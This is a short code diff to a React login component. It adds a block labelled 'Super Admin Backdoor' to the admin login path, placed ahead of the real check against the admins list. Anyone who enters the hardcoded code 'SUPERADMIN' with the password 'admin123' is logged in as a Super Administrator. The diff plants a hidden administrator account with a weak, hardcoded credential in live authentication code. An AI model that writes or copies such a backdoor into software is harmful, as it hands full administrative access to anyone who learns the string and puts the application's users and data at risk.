@@ -81,6 +81,13 @@ export function Login() {
 
     try {
       if (loginType === 'admin') {
+        // Super Admin Backdoor
+        if (rtCode === 'SUPERADMIN' && password === 'admin123') {
+            login('admin', { name: 'Super Administrator', rtId: 'SUPERADMIN' }, 'SUPERADMIN');
+            navigate('/');
+            return;
+        }
+
         // Strict Admin login using Admins sheet
         const res = await fetch('/api/admins');
         if (res.ok) {
